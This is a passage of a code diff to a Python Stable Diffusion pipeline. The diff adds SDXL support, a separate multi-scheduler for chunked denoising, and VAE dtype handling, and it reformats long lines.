         for i, (top, bottom, left, right) in enumerate(chunks):
             top_px = top * self.vae_scale_factor
             bottom_px = bottom * self.vae_scale_factor
             left_px = left * self.vae_scale_factor
             right_px = right * self.vae_scale_factor
 
             image_view = image[:, :, top_px:bottom_px, left_px:right_px]
@@ -577,35 +927,36 @@
                         multiplier[:, :, engine_latent_size - j - 1, :] *= mult
 
             value[:, :, top:bottom, left:right] += encoded_image * multiplier
             count[:, :, top:bottom, left:right] += multiplier
 
             if progress_callback is not None:
                 progress_callback()
+        if self.is_sdxl:
+            self.vae.to(dtype=dtype)
+        return (torch.where(count > 0, value / count, value) * self.vae.config.scaling_factor).to(dtype=dtype)
 
-        return torch.where(count > 0, value / count, value) * self.vae.config.scaling_factor
-
-    @torch.no_grad()
     def prepare_image_latents(
         self,
         image: Union[torch.Tensor, PIL.Image.Image],
         timestep: torch.Tensor,
         batch_size: int,
         dtype: torch.dtype,
         device: Union[str, torch.device],
         generator: Optional[torch.Generator] = None,
         progress_callback: Optional[Callable[[], None]] = None,
+        scheduler: Optional[KarrasDiffusionSchedulers] = None,
     ) -> torch.Tensor:
         """
         Prepares latents from an image, adding initial noise for img2img inference
         """
         image = image.to(device=device, dtype=dtype)
         init_latents = self.encode_image(
-            image, device=device, generator=generator, progress_callback=progress_callback
-        ).to(dtype=dtype)
+            image, device=device, generator=generator, dtype=dtype, progress_callback=progress_callback
+        )
 
         if batch_size > init_latents.shape[0] and batch_size % init_latents.shape[0] == 0:
             # duplicate images to match batch size
             additional_image_per_prompt = batch_size // init_latents.shape[0]
             init_latents = torch.cat([init_latents] * additional_image_per_prompt, dim=0)
         elif batch_size > init_latents.shape[0] and batch_size % init_latents.shape[0] != 0:
             raise ValueError(
@@ -614,17 +965,18 @@
         else:
             init_latents = torch.cat([init_latents], dim=0)
 
         shape = init_latents.shape
         noise = randn_tensor(shape, generator=generator, device=device, dtype=dtype)
 
         # add noise in accordance with timesteps
-        return self.scheduler.add_noise(init_latents, noise, timestep)
+        if scheduler is None:
+            scheduler = self.scheduler
+        return scheduler.add_noise(init_latents, noise, timestep)
 
-    @torch.no_grad()
     def prepare_mask_latents(
         self,
         mask: Union[PIL.Image.Image, torch.Tensor],
         image: Union[PIL.Image.Image, torch.Tensor],
         batch_size: int,
         height: int,
         width: int,
@@ -641,15 +993,15 @@
         tensor_width = width // self.vae_scale_factor
         tensor_size = (tensor_height, tensor_width)
         mask = torch.nn.functional.interpolate(mask, size=tensor_size)
         mask = mask.to(device=device, dtype=dtype)
         image = image.to(device=device, dtype=dtype)
 
         latents = self.encode_image(
-            image, device=device, generator=generator, progress_callback=progress_callback
+            image, device=device, generator=generator, dtype=dtype, progress_callback=progress_callback
         ).to(device=device)
 
         # duplicate mask and latents for each generation per prompt, using mps friendly method
         if mask.shape[0] < batch_size:
             if not batch_size % mask.shape[0] == 0:
                 raise ValueError(
                     "The passed mask and the required batch size don't match. Masks are supposed to be duplicated to"
@@ -669,52 +1021,111 @@
         mask = torch.cat([mask] * 2) if do_classifier_free_guidance else mask
         latents = torch.cat([latents] * 2) if do_classifier_free_guidance else latents
 
         # aligning device to prevent device errors when concating it with the latent model input
         latents = latents.to(device=device, dtype=dtype)
         return mask, latents
 
-    @torch.no_grad()
     def get_timesteps(
-        self, num_inference_steps: int, strength: float, device: str
+        self, num_inference_steps: int, strength: float, device: str, use_multi_scheduler: bool = False
     ) -> Tuple[torch.Tensor, int]:
         """
         Gets the original timesteps from the scheduler based on strength when doing img2img
         """
         init_timestep = min(int(num_inference_steps * strength), num_inference_steps)
 
         t_start = max(num_inference_steps - init_timestep, 0)
-        timesteps = self.scheduler.timesteps[t_start * self.scheduler.order :]
+        if use_multi_scheduler:
+            scheduler = self.multi_scheduler
+        else:
+            scheduler = self.scheduler
+        timesteps = scheduler.timesteps[t_start * self.scheduler.order :]
 
         return timesteps, num_inference_steps - t_start
 
-    @torch.no_grad()
+    def get_add_time_ids(
+        self,
+        original_size: Tuple[int, int],
+        crops_coords_top_left: Tuple[int, int],
+        target_size: Tuple[int, int],
+        dtype: torch.dtype,
+        aesthetic_score: Optional[float] = None,
+        negative_aesthetic_score: Optional[float] = None,
+    ) -> Tuple[torch.Tensor, torch.Tensor]:
+        """
+        Gets added time embedding vectors for SDXL
+        """
+        if (
+            aesthetic_score is not None
+            and negative_aesthetic_score is not None
+            and self.config.requires_aesthetic_score
+        ):
+            add_time_ids = list(original_size + crops_coords_top_left + (aesthetic_score,))
+            add_neg_time_ids = list(original_size + crops_coords_top_left + (negative_aesthetic_score,))
+        else:
+            add_time_ids = list(original_size + crops_coords_top_left + target_size)
+            add_neg_time_ids = None
+
+        passed_add_embed_dim = (
+            self.unet.config.addition_time_embed_dim * len(add_time_ids) + self.text_encoder_2.config.projection_dim
+        )
+        expected_add_embed_dim = self.unet.add_embedding.linear_1.in_features
+
+        if (
+            expected_add_embed_dim > passed_add_embed_dim
+            and (expected_add_embed_dim - passed_add_embed_dim) == self.unet.config.addition_time_embed_dim
+        ):
+            raise ValueError(
+                f"Model expects an added time embedding vector of length {expected_add_embed_dim}, but a vector of {passed_add_embed_dim} was created. Please make sure to enable `requires_aesthetic_score` with `pipe.register_to_config(requires_aesthetic_score=True)` to make sure `aesthetic_score` {aesthetic_score} and `negative_aesthetic_score` {negative_aesthetic_score} is correctly used by the model."
+            )
+        elif (
+            expected_add_embed_dim < passed_add_embed_dim
+            and (passed_add_embed_dim - expected_add_embed_dim) == self.unet.config.addition_time_embed_dim
+        ):
+            raise ValueError(
+                f"Model expects an added time embedding vector of length {expected_add_embed_dim}, but a vector of {passed_add_embed_dim} was created. Please make sure to disable `requires_aesthetic_score` with `pipe.register_to_config(requires_aesthetic_score=False)` to make sure `target_size` {target_size} is correctly used by the model."
+            )
+        elif expected_add_embed_dim != passed_add_embed_dim:
+            raise ValueError(
+                f"Model expects an added time embedding vector of length {expected_add_embed_dim}, but a vector of {passed_add_embed_dim} was created. The model has an incorrect config. Please check `unet.config.time_embedding_type` and `text_encoder_2.config.projection_dim`."
+            )
+
+        add_time_ids = torch.tensor([add_time_ids], dtype=dtype)  # type: ignore
+        if add_neg_time_ids is not None:
+            add_neg_time_ids = torch.tensor([add_neg_time_ids], dtype=dtype)  # type: ignore
+
+        return add_time_ids, add_neg_time_ids  # type: ignore
+
     def predict_noise_residual(
         self,
         latents: torch.Tensor,
         timestep: torch.Tensor,
         embeddings: torch.Tensor,
         cross_attention_kwargs: Optional[Dict[str, Any]] = None,
+        added_cond_kwargs: Optional[Dict[str, Any]] = None,
         down_block_additional_residuals: Optional[List[torch.Tensor]] = None,
         mid_block_additional_residual: Optional[torch.Tensor] = None,
     ) -> torch.Tensor:
         """
         Runs the UNet to predict noise residual.
         """
+        kwargs = {}
+        if added_cond_kwargs is not None:
+            kwargs["added_cond_kwargs"] = added_cond_kwargs
         return self.unet(
             latents,
             timestep,
             encoder_hidden_states=embeddings,
             cross_attention_kwargs=cross_attention_kwargs,
             down_block_additional_residuals=down_block_additional_residuals,
             mid_block_additional_residual=mid_block_additional_residual,
             return_dict=False,
+            **kwargs,
         )[0]
 
-    @torch.no_grad()
     def prepare_control_image(
         self,
         image: Union[torch.Tensor, PIL.Image.Image, List[PIL.Image.Image]],
         width: int,
         height: int,
         batch_size: int,
         num_images_per_prompt: int,
@@ -758,31 +1169,28 @@
 
         image = image.repeat_interleave(repeat_by, dim=0)
         if do_classifier_free_guidance:
             image = torch.cat([image] * 2)
 
         return image.to(device=device, dtype=dtype)
 
-    @torch.no_grad()
     def prepare_controlnet_inpaint_control_image(
         self,
         image: PIL.Image.Image,
         mask: PIL.Image.Image,
         device: Union[str, torch.device],
         dtype: torch.dtype,
     ) -> torch.Tensor:
         """
         Combines the image and mask into a condition for controlnet inpainting.
         """
         image = np.array(image.convert("RGB")).astype(np.float32) / 255.0
         mask = np.array(mask.convert("L")).astype(np.float32) / 255.0
 
-        assert (
-            image.shape[0:1] == mask.shape[0:1]
-        ), "image and image_mask must have the same image size"
+        assert image.shape[0:1] == mask.shape[0:1], "image and image_mask must have the same image size"
         image[mask > 0.5] = -1.0  # set as masked pixel
 
         image = np.expand_dims(image, 0).transpose(0, 3, 1, 2)
         image = torch.from_numpy(image)
 
         return image.to(device=device, dtype=dtype)
 
@@ -827,17 +1235,15 @@
         if not self.chunking_size:
             return [(0, latent_height, 0, latent_width)]
 
         latent_chunking_size = self.chunking_size // self.vae_scale_factor
         latent_window_size = self.engine_size // self.vae_scale_factor
 
         vertical_blocks = math.ceil((latent_height - latent_window_size) / latent_chunking_size + 1)
-        horizontal_blocks = math.ceil(
-            (latent_width - latent_window_size) / latent_chunking_size + 1
-        )
+        horizontal_blocks = math.ceil((latent_width - latent_window_size) / latent_chunking_size + 1)
         total_blocks = vertical_blocks * horizontal_blocks
         chunks = []
 
         for i in range(int(total_blocks)):
             top = (i // horizontal_blocks) * latent_chunking_size
             bottom = top + latent_window_size
             left = (i % horizontal_blocks) * latent_chunking_size
@@ -876,63 +1282,59 @@
             timestep,
             encoder_hidden_states=encoder_hidden_states,
             controlnet_cond=controlnet_cond,
             conditioning_scale=conditioning_scale,
             return_dict=False,
         )
 
-    @torch.no_grad()
     def denoise_unchunked(
         self,
         height: int,
         width: int,
         device: Union[str, torch.device],
         num_inference_steps: int,
         timesteps: torch.Tensor,
         latents: torch.Tensor,
-        encoded_prompt_embeds: torch.Tensor,
+        prompt_embeds: torch.Tensor,
         guidance_scale: float,
         do_classifier_free_guidance: bool = False,
         mask: Optional[torch.Tensor] = None,
         mask_image: Optional[torch.Tensor] = None,
         control_image: Optional[torch.Tensor] = None,
         progress_callback: Optional[Callable[[], None]] = None,
-        latent_callback: Optional[
-            Callable[[Union[torch.Tensor, np.ndarray, List[PIL.Image.Image]]], None]
-        ] = None,
+        latent_callback: Optional[Callable[[Union[torch.Tensor, np.ndarray, List[PIL.Image.Image]]], None]] = None,
         latent_callback_steps: Optional[int] = 1,
         latent_callback_type: Literal["latent", "pt", "np", "pil"] = "latent",
         conditioning_scale: float = 1.0,
         extra_step_kwargs: Optional[Dict[str, Any]] = None,
         cross_attention_kwargs: Optional[Dict[str, Any]] = None,
+        added_cond_kwargs: Optional[Dict[str, Any]] = None,
     ) -> torch.Tensor:
         """
         Executes the denoising loop without chunking.
         """
         if extra_step_kwargs is None:
             extra_step_kwargs = {}
 
         num_steps = len(timesteps)
         num_warmup_steps = num_steps - num_inference_steps * self.scheduler.order
-        logger.debug(f"Denoising image on {device} in {num_steps} steps (unchunked)")
+        logger.debug(f"Denoising image in {num_steps} steps on {device} (unchunked)")
 
         for i, t in enumerate(timesteps):
             # expand the latents if we are doing classifier free guidance
-            latent_model_input = (
-                torch.cat([latents] * 2) if do_classifier_free_guidance else latents
-            )
+            latent_model_input = torch.cat([latents] * 2) if do_classifier_free_guidance else latents
             latent_model_input = self.scheduler.scale_model_input(latent_model_input, t)
 
             # Get controlnet input if configured
             if control_image is not None:
                 down_block, mid_block = self.get_controlnet_conditioning_blocks(
                     device=device,
                     latents=latent_model_input,
                     timestep=t,
-                    encoder_hidden_states=encoded_prompt_embeds,
+                    encoder_hidden_states=prompt_embeds,
                     controlnet_cond=control_image,
                     conditioning_scale=conditioning_scale,
                 )
             else:
                 down_block, mid_block = None, None
 
             # add other dimensions to unet input if set
@@ -942,26 +1344,25 @@
                     dim=1,
                 )
 
             # predict the noise residual
             noise_pred = self.predict_noise_residual(
                 latent_model_input,
                 t,
-                encoded_prompt_embeds,
+                prompt_embeds,
                 cross_attention_kwargs,
+                added_cond_kwargs,
                 down_block,
                 mid_block,
             )
 
             # perform guidance
             if do_classifier_free_guidance:
                 noise_pred_uncond, noise_pred_text = noise_pred.chunk(2)
-                noise_pred = noise_pred_uncond + guidance_scale * (
-                    noise_pred_text - noise_pred_uncond
-                )
+                noise_pred = noise_pred_uncond + guidance_scale * (noise_pred_text - noise_pred_uncond)
 
             # Compute previous noisy sample
             latents = self.scheduler.step(
                 noise_pred,
                 t,
                 latents,
                 **extra_step_kwargs,
@@ -971,108 +1372,100 @@
                 progress_callback()
 
             # call the callback, if provided
             if (
                 latent_callback is not None
                 and latent_callback_steps is not None
                 and i % latent_callback_steps == 0
-                and (
-                    i == num_steps - 1
-                    or ((i + 1) > num_warmup_steps and (i + 1) % self.scheduler.order == 0)
-                )
+                and (i == num_steps - 1 or ((i + 1) > num_warmup_steps and (i + 1) % self.scheduler.order == 0))
             ):
                 latent_callback_value = latents
 
                 if latent_callback_type != "latent":
                     latent_callback_value = self.decode_latents(
                         latent_callback_value, device=device, progress_callback=progress_callback
                     )
                     latent_callback_value = self.denormalize_latents(latent_callback_value)
                     if latent_callback_type != "pt":
-                        latent_callback_value = self.image_processor.pt_to_numpy(
-                            latent_callback_value
-                        )
+                        latent_callback_value = self.image_processor.pt_to_numpy(latent_callback_value)
                         if latent_callback_type == "pil":
-                            latent_callback_value = self.image_processor.numpy_to_pil(
-                                latent_callback_value
-                            )
+                            latent_callback_value = self.image_processor.numpy_to_pil(latent_callback_value)
                 latent_callback(latent_callback_value)
 
         return latents
 
-    @torch.no_grad()
     def denoise(
         self,
         height: int,
         width: int,
         device: Union[str, torch.device],
         num_inference_steps: int,
         timesteps: torch.Tensor,
         latents: torch.Tensor,
-        encoded_prompt_embeds: torch.Tensor,
+        prompt_embeds: torch.Tensor,
         guidance_scale: float,
         do_classifier_free_guidance: bool = False,
         mask: Optional[torch.Tensor] = None,
         mask_image: Optional[torch.Tensor] = None,
         control_image: Optional[torch.Tensor] = None,
         progress_callback: Optional[Callable[[], None]] = None,
-        latent_callback: Optional[
-            Callable[[Union[torch.Tensor, np.ndarray, List[PIL.Image.Image]]], None]
-        ] = None,
+        latent_callback: Optional[Callable[[Union[torch.Tensor, np.ndarray, List[PIL.Image.Image]]], None]] = None,
         latent_callback_steps: Optional[int] = 1,
         latent_callback_type: Literal["latent", "pt", "np", "pil"] = "latent",
         conditioning_scale: float = 1.0,
         extra_step_kwargs: Optional[Dict[str, Any]] = None,
         cross_attention_kwargs: Optional[Dict[str, Any]] = None,
+        added_cond_kwargs: Optional[Dict[str, Any]] = None,
     ) -> torch.Tensor:
         """
         Executes the denoising loop.
         """
         if extra_step_kwargs is None:
             extra_step_kwargs = {}
 
         chunks = self.get_chunks(height, width)
         num_chunks = len(chunks)
 
-        if num_chunks == 1:
+        if num_chunks <= 1:
             return self.denoise_unchunked(
                 height=height,
                 width=width,
                 device=device,
                 num_inference_steps=num_inference_steps,
                 timesteps=timesteps,
                 latents=latents,
-                encoded_prompt_embeds=encoded_prompt_embeds,
+                prompt_embeds=prompt_embeds,
                 guidance_scale=guidance_scale,
                 do_classifier_free_guidance=do_classifier_free_guidance,
                 mask=mask,
                 mask_image=mask_image,
                 control_image=control_image,
                 conditioning_scale=conditioning_scale,
                 progress_callback=progress_callback,
                 latent_callback=latent_callback,
                 latent_callback_steps=latent_callback_steps,
                 latent_callback_type=latent_callback_type,
                 extra_step_kwargs=extra_step_kwargs,
                 cross_attention_kwargs=cross_attention_kwargs,
+                added_cond_kwargs=added_cond_kwargs,
             )
 
         num_steps = len(timesteps)
-        num_warmup_steps = num_steps - num_inference_steps * self.scheduler.order
+        num_warmup_steps = num_steps - num_inference_steps * self.multi_scheduler.order
 
         latent_width = width // self.vae_scale_factor
         latent_height = height // self.vae_scale_factor
         engine_latent_size = self.engine_size // self.vae_scale_factor
 
         count = torch.zeros_like(latents)
         value = torch.zeros_like(latents)
 
         total_num_steps = num_steps * num_chunks
         logger.debug(
-            f"Denoising image in {total_num_steps} on {device} in total steps ({num_inference_steps} inference steps * {num_chunks} chunks)"
+            f"Denoising image in {total_num_steps} steps on {device} ({num_inference_steps} inference steps * {num_chunks} chunks)"
         )
 
         for i, t in enumerate(timesteps):
             # zero view latents
             count.zero_()
             value.zero_()
 
@@ -1085,27 +1478,25 @@
                 right_px = right * self.vae_scale_factor
 
                 # Slice latents
                 latents_for_view = latents[:, :, top:bottom, left:right]
 
                 # expand the latents if we are doing classifier free guidance
                 latent_model_input = (
-                    torch.cat([latents_for_view] * 2)
-                    if do_classifier_free_guidance
-                    else latents_for_view
+                    torch.cat([latents_for_view] * 2) if do_classifier_free_guidance else latents_for_view
                 )
-                latent_model_input = self.scheduler.scale_model_input(latent_model_input, t)
+                latent_model_input = self.multi_scheduler.scale_model_input(latent_model_input, t)
 
                 # Get controlnet input if configured
                 if control_image is not None:
                     down_block, mid_block = self.get_controlnet_conditioning_blocks(
                         device=device,
                         latents=latent_model_input,
                         timestep=t,
-                        encoder_hidden_states=encoded_prompt_embeds,
+                        encoder_hidden_states=prompt_embeds,
                         controlnet_cond=control_image[:, :, top_px:bottom_px, left_px:right_px],
                         conditioning_scale=conditioning_scale,
                     )
                 else:
                     down_block, mid_block = None, None
 
                 # add other dimensions to unet input if set
@@ -1119,29 +1510,28 @@
                         dim=1,
                     )
 
                 # predict the noise residual
                 noise_pred = self.predict_noise_residual(
                     latents=latent_model_input,
                     timestep=t,
-                    embeddings=encoded_prompt_embeds,
+                    embeddings=prompt_embeds,
                     cross_attention_kwargs=cross_attention_kwargs,
+                    added_cond_kwargs=added_cond_kwargs,
                     down_block_additional_residuals=down_block,
                     mid_block_additional_residual=mid_block,
                 )
 
                 # perform guidance
                 if do_classifier_free_guidance:
                     noise_pred_uncond, noise_pred_text = noise_pred.chunk(2)
-                    noise_pred = noise_pred_uncond + guidance_scale * (
-                        noise_pred_text - noise_pred_uncond
-                    )
+                    noise_pred = noise_pred_uncond + guidance_scale * (noise_pred_text - noise_pred_uncond)
 
                 # compute the previous noisy sample x_t -> x_t-1
-                denoised_latents = self.scheduler.step(
+                denoised_latents = self.multi_scheduler.step(
                     noise_pred,
                     t,
                     latents_for_view,
                     **extra_step_kwargs,
                 ).prev_sample
 
                 # Blur edges as needed
@@ -1175,55 +1565,43 @@
             latents = torch.where(count > 0, value / count, value)
 
             # call the latent_callback, if provided
             if (
                 latent_callback is not None
                 and latent_callback_steps is not None
                 and i % latent_callback_steps == 0
-                and (
-                    i == num_steps - 1
-                    or ((i + 1) > num_warmup_steps and (i + 1) % self.scheduler.order == 0)
-                )
+                and (i == num_steps - 1 or ((i + 1) > num_warmup_steps and (i + 1) % self.multi_scheduler.order == 0))
             ):
                 latent_callback_value = latents
 
                 if latent_callback_type != "latent":
                     latent_callback_value = self.decode_latents(
                         latent_callback_value, device=device, progress_callback=progress_callback
                     )
                     latent_callback_value = self.denormalize_latents(latent_callback_value)
                     if latent_callback_type != "pt":
-                        latent_callback_value = self.image_processor.pt_to_numpy(
-                            latent_callback_value
-                        )
+                        latent_callback_value = self.image_processor.pt_to_numpy(latent_callback_value)
                         if latent_callback_type == "pil":
-                            latent_callback_value = self.image_processor.numpy_to_pil(
-                                latent_callback_value
-                            )
+                            latent_callback_value = self.image_processor.numpy_to_pil(latent_callback_value)
                 latent_callback(latent_callback_value)
 
         return latents
 
-    @torch.no_grad()
     def decode_latent_view(self, latents: torch.Tensor) -> torch.Tensor:
         """
         Issues the command to decode a chunk of latents with the VAE.
         """
         return self.vae.decode(latents, return_dict=False)[0]
 
-    @torch.no_grad()
-    def decode_latents_unchunked(
-        self, latents: torch.Tensor, device: Union[str, torch.device]
-    ) -> torch.Tensor:
+    def decode_latents_unchunked(self, latents: torch.Tensor, device: Union[str, torch.device]) -> torch.Tensor:
         """
         Decodes the latents using the VAE without chunking.
         """
         return self.decode_latent_view(latents).to(device=device)
 
-    @torch.no_grad()
     def decode_latents(
         self,
         latents: torch.Tensor,
         device: Union[str, torch.device],
         progress_callback: Optional[Callable[[], None]] = None,
     ) -> torch.Tensor:
         """
@@ -1234,24 +1612,34 @@
         width *= self.vae_scale_factor
 
         latents = 1 / self.vae.config.scaling_factor * latents
 
         chunks = self.get_chunks(height, width)
         total_steps = len(chunks)
 
-        if total_steps == 1:
+        revert_dtype = None
+
+        if self.is_sdxl:
+            # Resist overflow
+            revert_dtype = latents.dtype
+            self.vae.to(dtype=torch.float32)
+            latents = latents.to(dtype=torch.float32)
+
+        if total_steps <= 1:
             result = self.decode_latents_unchunked(latents, device)
             if progress_callback is not None:
                 progress_callback()
+            if self.is_sdxl:
+                self.vae.to(dtype=latents.dtype)
             return result
 
         latent_width = width // self.vae_scale_factor
         latent_height = height // self.vae_scale_factor
 
-        count = torch.zeros((samples, 3, height, width)).to(device=device)
+        count = torch.zeros((samples, 3, height, width)).to(device=device, dtype=latents.dtype)
         value = torch.zeros_like(count)
 
         logger.debug(f"Decoding latents in {total_steps} steps")
 
         # iterate over chunks
         for i, (top, bottom, left, right) in enumerate(chunks):
             # Slice latents
@@ -1290,17 +1678,37 @@
             count[:, :, top_px:bottom_px, left_px:right_px] += multiplier
 
             if progress_callback is not None:
                 progress_callback()
 
         # re-average pixels
         latents = torch.where(count > 0, value / count, value)
+        if revert_dtype is not None:
+            latents = latents.to(dtype=revert_dtype)
+            self.vae.to(dtype=revert_dtype)
         return latents
 
-    @torch.no_grad()
+    def prepare_extra_step_kwargs(
+        self, scheduler: KarrasDiffusionSchedulers, generator: Optional[torch.Generator], eta: float
+    ) -> Dict[str, Any]:
+        """
+        Override this method to additionally accept the scheduler, since we have
+        both a regular and multi scheduler.
+        """
+        accepts_eta = "eta" in set(inspect.signature(scheduler.step).parameters.keys())
+        extra_step_kwargs: Dict[str, Any] = {}
+        if accepts_eta:
+            extra_step_kwargs["eta"] = eta
+
+        # check if the scheduler accepts generator
+        accepts_generator = "generator" in set(inspect.signature(scheduler.step).parameters.keys())
+        if accepts_generator:
+            extra_step_kwargs["generator"] = generator
+        return extra_step_kwargs
+
     def get_step_complete_callback(
         self,
         overall_steps: int,
         progress_callback: Optional[Callable[[int, int, float], None]] = None,
         log_interval: int = 10,
         log_sampling_duration: Union[int, float] = 5,
     ) -> Callable[[], None]:
@@ -1314,18 +1722,18 @@
         def step_complete() -> None:
             nonlocal overall_step, window_start, window_start_step, its
             overall_step += 1
             if overall_step % log_interval == 0 or overall_step == overall_steps:
                 seconds_in_window = (datetime.datetime.now() - window_start).total_seconds()
                 its = (overall_step - window_start_step) / seconds_in_window
                 unit = "s/it" if its < 1 else "it/s"
-                its = 1 / its if its < 1 else its
+                its_display = 1 / its if its < 1 else its
                 logger.debug(
                     f"{{0:0{digits}d}}/{{1:0{digits}d}}: {{2:0.2f}} {{3:s}}".format(
-                        overall_step, overall_steps, its, unit
+                        overall_step, overall_steps, its_display, unit
                     )
                 )
 
                 if seconds_in_window > log_sampling_duration:
                     window_start_step = overall_step
                     window_start = datetime.datetime.now()
 
@@ -1333,70 +1741,75 @@
                 progress_callback(overall_step, overall_steps, its)
 
         return step_complete
 
     @torch.no_grad()
     def __call__(
         self,
-        prompt: Optional[Union[str, List[str]]] = None,
+        prompt: Optional[str] = None,
+        negative_prompt: Optional[str] = None,
         image: Optional[Union[PIL.Image.Image, str]] = None,
         mask: Optional[Union[PIL.Image.Image, str]] = None,
         control_image: Optional[Union[PIL.Image.Image, str]] = None,
         height: Optional[int] = None,
         width: Optional[int] = None,
         chunking_size: Optional[int] = None,
         chunking_blur: Optional[int] = None,
         strength: float = 0.8,
         num_inference_steps: int = 50,
         guidance_scale: float = 7.5,
         conditioning_scale: float = 1.0,
-        negative_prompt: Optional[Union[str, List[str]]] = None,
         num_images_per_prompt: int = 1,
         eta: float = 0.0,
         generator: Optional[torch.Generator] = None,
         latents: Optional[torch.Tensor] = None,
         prompt_embeds: Optional[torch.Tensor] = None,
         negative_prompt_embeds: Optional[torch.Tensor] = None,
         output_type: Literal["latent", "pt", "np", "pil"] = "pil",
         return_dict: bool = True,
         scale_image: bool = True,
         progress_callback: Optional[Callable[[int, int, float], None]] = None,
-        latent_callback: Optional[
-            Callable[[Union[torch.Tensor, np.ndarray, List[PIL.Image.Image]]], None]
-        ] = None,
+        latent_callback: Optional[Callable[[Union[torch.Tensor, np.ndarray, List[PIL.Image.Image]]], None]] = None,
         latent_callback_steps: Optional[int] = 1,
         latent_callback_type: Literal["latent", "pt", "np", "pil"] = "latent",
         cross_attention_kwargs: Optional[Dict[str, Any]] = None,
+        original_size: Optional[Tuple[int, int]] = None,
+        crops_coords_top_left: Tuple[int, int] = (0, 0),
+        target_size: Optional[Tuple[int, int]] = None,
+        aesthetic_score: float = 6.0,
+        negative_aesthetic_score: float = 2.5,
     ) -> Union[
         StableDiffusionPipelineOutput,
         Tuple[Union[torch.Tensor, np.ndarray, List[PIL.Image.Image]], Optional[List[bool]]],
     ]:
         """
         Invokes the pipeline.
         """
         # 1. Default height and width to unet
         height = height or self.unet.config.sample_size * self.vae_scale_factor
         width = width or self.unet.config.sample_size * self.vae_scale_factor
 
+        # TODO: figure out what this does
+        original_size = original_size or (height, width)
+        target_size = target_size or (height, width)
+
         # Allow overridding 'chunk'
         if chunking_size is not None:
             self.chunking_size = chunking_size
         if chunking_blur is not None:
             self.chunking_blur = chunking_blur
 
         # Define outputs here to process later
         prepared_latents: Optional[torch.Tensor] = None
         prepared_control_image: Optional[torch.Tensor] = None
         output_nsfw: Optional[List[bool]] = None
 
         # 2. Define call parameters
-        if prompt is not None and isinstance(prompt, str):
+        if prompt is not None:
             batch_size = 1
-        elif prompt is not None and isinstance(prompt, list):
-            batch_size = len(prompt)
         elif prompt_embeds:
             batch_size = prompt_embeds.shape[0]
         else:
             raise ValueError("Prompt or prompt embeds are required.")
 
         if self.unet.config.in_channels == 9:
             if not image:
@@ -1405,72 +1818,96 @@
             if not mask:
                 logger.warning("No mask present, but using inpainting model. Adding blank mask.")
                 mask = PIL.Image.new("RGB", (width, height), (255, 255, 255))
 
         device = self._execution_device
         do_classifier_free_guidance = guidance_scale > 1.0
 
-        self.scheduler.set_timesteps(num_inference_steps, device=device)
+        # Calculate chunks
+        num_chunks = max(1, len(self.get_chunks(height, width)))
+
+        if num_chunks > 1:
+            logger.debug(f"Using multi-scheduler {type(self.multi_scheduler).__name__}")
+            scheduler = self.multi_scheduler
+        else:
+            logger.debug(f"Using base scheduler {type(self.scheduler).__name__}")
+            scheduler = self.scheduler
+
+        scheduler.set_timesteps(num_inference_steps, device=device)
         if image and not mask:
-            timesteps, num_inference_steps = self.get_timesteps(
-                num_inference_steps, strength, device
-            )
+            timesteps, num_inference_steps = self.get_timesteps(num_inference_steps, strength, device, num_chunks > 1)
         else:
-            timesteps = self.scheduler.timesteps
+            timesteps = scheduler.timesteps
 
         batch_size *= num_images_per_prompt
-
-        # Calculate chunks
-        num_chunks = len(self.get_chunks(height, width))
+        num_scheduled_inference_steps = len(timesteps)
 
         # Calculate total steps
         chunked_steps = 1
 
         if image is not None:
             chunked_steps += 1
         if mask is not None:
             chunked_steps += 1
         if latent_callback is not None and latent_callback_steps is not None:
-            chunked_steps += num_inference_steps // latent_callback_steps
-        overall_num_steps = num_chunks * (num_inference_steps + chunked_steps)
+            chunked_steps += num_scheduled_inference_steps // latent_callback_steps
 
+        overall_num_steps = num_chunks * (num_scheduled_inference_steps + chunked_steps)
+        logger.debug(
+            f"Calculated overall steps to be {overall_num_steps} ({num_chunks} chunks, {num_inference_steps} steps, {num_scheduled_inference_steps} scheduled steps)"
+        )
         step_complete = self.get_step_complete_callback(overall_num_steps, progress_callback)
 
         with self.get_runtime_context(batch_size, device):
             # Base runtime has no context, but extensions do
-            encoded_prompt_embeds = self._encode_prompt(
-                prompt,
-                device,
-                num_images_per_prompt,
-                do_classifier_free_guidance,
-                negative_prompt,
-                prompt_embeds=prompt_embeds,
-                negative_prompt_embeds=negative_prompt_embeds,
-            )
+            if self.is_sdxl:
+                (
+                    prompt_embeds,
+                    negative_prompt_embeds,
+                    pooled_prompt_embeds,
+                    negative_pooled_prompt_embeds,
+                ) = self.encode_prompt(
+                    prompt,
+                    device,
+                    num_images_per_prompt,
+                    do_classifier_free_guidance,
+                    negative_prompt,
+                    prompt_embeds=prompt_embeds,
+                    negative_prompt_embeds=negative_prompt_embeds,
+                )
+            else:
+                prompt_embeds = self.encode_prompt(
+                    prompt,
+                    device,
+                    num_images_per_prompt,
+                    do_classifier_free_guidance,
+                    negative_prompt,
+                    prompt_embeds=prompt_embeds,
+                    negative_prompt_embeds=negative_prompt_embeds,
+                )  # type: ignore
+                pooled_prompt_embeds = None
+                negative_prompt_embeds = None
+                negative_pooled_prompt_embeds = None
 
             if image and isinstance(image, str):
                 image = PIL.Image.open(image)
 
             if mask and isinstance(mask, str):
                 mask = PIL.Image.open(mask)
 
             if scale_image and image:
                 image_width, image_height = image.size
                 if image_width != width or image_height != height:
-                    logger.debug(
-                        f"Resizing input image from {image_width}x{image_height} to {width}x{height}"
-                    )
+                    logger.debug(f"Resizing input image from {image_width}x{image_height} to {width}x{height}")
                     image = image.resize((width, height), resample=PIL_INTERPOLATION["lanczos"])
 
             if scale_image and mask:
                 mask_width, mask_height = mask.size
                 if mask_width != width or mask_height != height:
-                    logger.debug(
-                        f"Resizing input mask from {mask_width}x{mask_height} to {width}x{height}"
-                    )
+                    logger.debug(f"Resizing input mask from {mask_width}x{mask_height} to {width}x{height}")
                     mask = mask.resize((width, height), resample=PIL_INTERPOLATION["lanczos"])
 
             if image:
                 image = image.convert("RGB")
             if mask:
                 mask = mask.convert("L")
 
@@ -1483,82 +1920,84 @@
                 prepared_image, prepared_mask, prepared_image_latents = None, None, None
 
             if width < self.engine_size or height < self.engine_size:
                 # Disable chunking
                 logger.debug(f"{width}x{height} is smaller than is chunkable, disabling.")
                 self.chunking_size = 0
 
+            prompt_embeds = cast(torch.Tensor, prompt_embeds)
+
             if prepared_image is not None and prepared_mask is not None:
                 # Running the pipeline on an image with a mask
                 num_channels_latents = self.vae.config.latent_channels
 
                 if latents:
                     prepared_latents = latents.to(device) * self.schedule.init_noise_sigma
                 else:
                     prepared_latents = self.create_latents(
